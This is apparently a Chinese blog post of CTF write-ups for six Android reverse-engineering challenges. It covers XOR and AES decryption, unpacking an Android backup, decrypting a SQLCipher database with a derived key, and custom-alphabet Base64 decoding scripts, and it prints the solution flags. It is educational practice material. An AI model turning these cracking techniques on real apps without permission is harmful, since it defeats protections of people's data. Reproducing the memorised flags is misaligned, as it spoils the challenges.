    <content type="html"><![CDATA[<h1 id="1-app1"><a href="#1-app1" class="headerlink" title="1. app1"></a>1. app1</h1><p>这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。</p><img src="/posts/9f62af2/1.1.png" class="" title="jeb分析"><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v5le0n9;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="string">&quot;X&lt;cP[?PHNB&lt;P?aj&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> v3.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">    <span class="type">int</span> v0;</span><br><span class="line">    <span class="type">int</span>[] v5 = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">    <span class="keyword">for</span>(v0=<span class="number">0</span>; v0&lt;len; v0++)</span><br><span class="line">    &#123;</span><br><span class="line">        v5[v0] = v3.charAt(v0) ^ v4;</span><br><span class="line">        System.out.printf(<span class="string">&quot;%c&quot;</span>,v5[v0]);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">W3l_T0_GAM3_0ne</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="2-app2"><a href="#2-app2" class="headerlink" title="2. app2"></a>2. app2</h1><img src="/posts/9f62af2/2.1.png" class="" title="运行程序"><p>载入AK由so文件，程序可动态调试。载入jeb查看Java源码。</p><img src="/posts/9f62af2/2.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/2.3.png" class="" title="Logcat"><img src="/posts/9f62af2/2.4.png" class="" title="Logcat"><img src="/posts/9f62af2/2.5.png" class="" title="jeb分析"><p>将x86目录下的so文件载入IDA32，在Exports表里找到<code>doRawData</code>函数，查看伪代码。</p><img src="/posts/9f62af2/2.6.png" class="" title="IDA分析"><p>python3解决from Crypto.Cipher import AES报错问题：<a href="https://www.dandelioncloud.cn/article/details/1018083534028833">https://www.dandelioncloud.cn/article/details/1018083534028833</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher=base64.b64decode(<span class="string">&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;</span>)</span><br><span class="line">key = <span class="string">&quot;thisisatestkey==&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">msg = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">aimagetencent</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>发现这个也不是flag。再分析一下XML文件。还有<code>FileDataActivity</code>我们还没有分析。</p><img src="/posts/9f62af2/2.7.png" class="" title="jeb分析"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher=base64.b64decode(<span class="string">&quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;</span>)</span><br><span class="line">key = <span class="string">&quot;thisisatestkey==&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">msg = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Cas3_0f_A_CAK3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以这题到底怎么转换到<code>FileDataActivity</code>去的，迷惑。</p><h1 id="3-app3"><a href="#3-app3" class="headerlink" title="3. app3"></a>3. app3</h1><p>下载下来是一个<code>.ab</code>文件，<code>.ab</code>文件是 Android 系统的备份文件格式，它分为加密和未加密两种类型。<code>.ab</code>文件的前 24 个字节是类似文件头的东西，如果是加密的，在前 24 个字节中会有 AES-256 的标志，如果未加密，则在前 24 个字节中会有 none 的标志。</p><img src="/posts/9f62af2/3.1.png" class="" title="文件头"><p>下载<code>abe.jar</code>，将<code>.ab</code>文件解压。在abe目录下运行cmd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar abe.jar unpack C:\Users\dell\Desktop\app3.ab app3.tar</span><br></pre></td></tr></table></figure><p><code>.tar</code>文件在Windows也可解压。找到<code>.apk</code>文件安装到模拟器，又运行不了。</p><img src="/posts/9f62af2/3.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.3.png" class="" title="jeb分析"><p>因为没有跳转语句，无论输入什么都是出来这句话。再看看有什么隐藏的<code>&lt;activity&gt;</code>，发现也只有我们分析过的那两个。</p><img src="/posts/9f62af2/3.4.png" class="" title="jeb分析"><p>再去那两个<code>&lt;activity&gt;</code>仔细分析我们刚才没有分析的，肯定是有什么遗漏了。</p><img src="/posts/9f62af2/3.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.7.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.8.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.9.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.10.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.11.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.12.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.13.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.14.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.15.png" class="" title="jeb分析"><p>SHA1=”Stra1234” + “44e2e4457d4e252ca5b9fe9d20b3fea5” + “yaphetshan”= ae56f99638285eb0743d8bf76d2b0c80e5cbb096，取前7位就是ae56f99。</p><p>我们刚才说的有加密，是用SqlCipher加密的，而这个就是数据库的密码。</p><p>解压包除<code>.apk</code>文件之外，还有两个<code>.db</code>文件，一个<code>Demo.db</code>，另一个是<code>Encrypt.db</code>，因为在Java代码里面是<code>Demo.db</code>，所以解密也应该是解密这一个。</p><p>安装sqlcipher用来解密数据库，上面分析写着版本为<code>3.4.0</code>，Linux注意对应版本，Windows下载最新也就<code>3.0.1</code>，所以没问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\sqlcipher-3.0.1\bin&gt;sqlcipher-shell64.exe Demo.db</span><br><span class="line">sqlite&gt; PRAGMA key = &quot;ae56f99&quot;;</span><br><span class="line">sqlite&gt; ATTACH DATABASE &#x27;app3_1.db&#x27; AS plaintext KEY &quot;&quot;;</span><br><span class="line">sqlite&gt; SELECT sqlcipher_export(&quot;plaintext&quot;);</span><br><span class="line"></span><br><span class="line">sqlite&gt; DETACH DATABASE plaintext;</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure><p>安装SQLite数据库：<a href="https://nightlies.sqlitebrowser.org/latest/">https://nightlies.sqlitebrowser.org/latest/</a> </p><p>SQLite用来打开解密后的<code>.db</code>文件，加密的<code>.db</code>文件SQLite打不开，也就是为什么我们要解密数据库的原因。</p><img src="/posts/9f62af2/3.16.png" class="" title="数据库"><p>结果不是…那我们再试试<code>Encryto.db</code>。</p><img src="/posts/9f62af2/3.17.png" class="" title="数据库"><p>很明显的Base64，拿去解码得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=</span><br><span class="line"></span><br><span class="line">Tctf&#123;H3ll0_Do_Y0u_Lov3_Tenc3nt!&#125;</span><br></pre></td></tr></table></figure><h1 id="4-easy-apk"><a href="#4-easy-apk" class="headerlink" title="4. easy_apk"></a>4. easy_apk</h1><img src="/posts/9f62af2/4.1.png" class="" title="运行程序"><p>载入AK没发现lib文件，载入jeb查看源码：</p><img src="/posts/9f62af2/4.2.png" class="" title="jeb分析"><p>天真的我就拿去Base64解码了，结果解码失败。回来再看，它是新Base64，点进去查看它的算法，发现它是把索引表给替换了。</p><p>拿Base64变种脚本替换索引表即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># base 字符集</span></span><br><span class="line"><span class="comment"># base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;+/&#x27;</span></span><br><span class="line">base64_charset = <span class="string">&quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位</span></span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes]</span><br><span class="line">     </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">3</span>     </span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">         <span class="comment"># 取对应base64字符</span></span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit])</span><br><span class="line">         integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         <span class="comment"># 补⻬三个字节，每个字节补充 0000 0000</span></span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=</span></span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:remain + <span class="number">1</span>]</span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">base64_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_base64_str(base64_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(s))).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> base64_str <span class="keyword">if</span> s != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    resp = <span class="built_in">bytearray</span>()</span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">4</span></span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">4</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line">         integral_part = integral_part[<span class="number">4</span>:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="number">4</span>:])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">         resp.append(i)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_base64_str</span>(<span class="params">b_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b_str) % <span class="number">4</span>:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> b_str:</span><br><span class="line">     <span class="keyword">if</span> m != <span class="string">&quot;=&quot;</span> <span class="keyword">and</span> m <span class="keyword">not</span> <span class="keyword">in</span> base64_charset:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     local_base64 = <span class="string">&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;使用本地base64解密：&#x27;</span>, decode(local_base64).decode())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用本地base64解密： 05397c42f9b6da593a3644162d36eb01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;05397c42f9b6da593a3644162d36eb01&#125;</span><br></pre></td></tr></table></figure><h1 id="5-RememberOther"><a href="#5-RememberOther" class="headerlink" title="5. RememberOther"></a>5. RememberOther</h1><p>运行一下程序。</p><img src="/posts/9f62af2/5.1.png" class="" title="运行程序"><p>拿去AK，没有看到需要动态调试的so文件。</p><p>拿去jeb分析代码：</p><img src="/posts/9f62af2/5.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/5.3.png" class="" title="jeb分析"><p>那我们试试直接点注册。</p><img src="/posts/9f62af2/5.4.png" class="" title="出现MD5值"><p>MD5的奇数位为<code>b216ebb92fa5caf6</code>，再将MD5值解密，解出来为<code>YOU_KNOW_</code>(究竟哪个网站可以免费解MD5，我还是看牛牛们的wp才知道是这个答案)。拿到程序去验证没错。<code>YOU_KNOW_</code>很明显是flag形式，后面还缺了些东西，出题人给了剩下的线索。</p><img src="/posts/9f62af2/5.5.png" class="" title="线索"><p>你懂！你懂安卓！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOU_KNOW_ANDROID</span><br></pre></td></tr></table></figure><h1 id="6-easyjni"><a href="#6-easyjni" class="headerlink" title="6. easyjni"></a>6. easyjni</h1><p>这道题看名字就知道考察jni。</p><img src="/posts/9f62af2/6.1.png" class="" title="运行程序"><p>载入AK，看到lib目录下有<code>libnative.so</code>文件，是armeabi-v7a架构的。载入jeb，代码混淆了，没关系一个个方法分析。</p><p>在判断语句，调用了MainActivity.a方法，其中一个实参就是我们输入的内容。MainActivity.a方法返回到私有a方法里，形参是我们输入的内容。再看私有a方法，调用了ncheck()方法。</p><img src="/posts/9f62af2/6.2.png" class="" title="jeb分析"><p>调用ncheck()方法前，还创建了一个a类对象，先进去看看a类的a方法。发现是变种Base64加密。</p><img src="/posts/9f62af2/6.3.png" class="" title="jeb分析"><p>将apk文件解包，将里面的so文件载入IDA。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;apktool d easyjni.apk</span><br><span class="line">I: Using Apktool 2.6.1 on easyjni.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: C:\Users\dell\AppData\Local\apktool\framework\1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure><p>在Export模块找到ncheck()方法。</p><img src="/posts/9f62af2/6.4.png" class="" title="IDA分析"><img src="/posts/9f62af2/6.5.png" class="" title="IDA分析"><p>哇这就有点恶心人了哈，我从没见过等号在中间的。仔细分析一下IDA源码，原来不过如此。</p><img src="/posts/9f62af2/6.6.png" class="" title="IDA分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</span><br><span class="line"></span><br><span class="line"># i和i+1对换</span><br><span class="line">bM3TQsXg30i9g3==QAoOQMPFks1BsB7c</span><br><span class="line"></span><br><span class="line"># 前16位与后16位对换</span><br><span class="line">QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br></pre></td></tr></table></figure><p>再用4中的变种Base64脚本解决。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># base 字符集</span></span><br><span class="line"><span class="comment"># base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;+/&#x27;</span></span><br><span class="line">base64_charset = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位</span></span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes]</span><br><span class="line">     </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">3</span>     </span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">         <span class="comment"># 取对应base64字符</span></span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit])</span><br><span class="line">         integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         <span class="comment"># 补⻬三个字节，每个字节补充 0000 0000</span></span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=</span></span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:remain + <span class="number">1</span>]</span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">base64_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_base64_str(base64_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(s))).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> base64_str <span class="keyword">if</span> s != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    resp = <span class="built_in">bytearray</span>()</span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">4</span></span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">4</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span 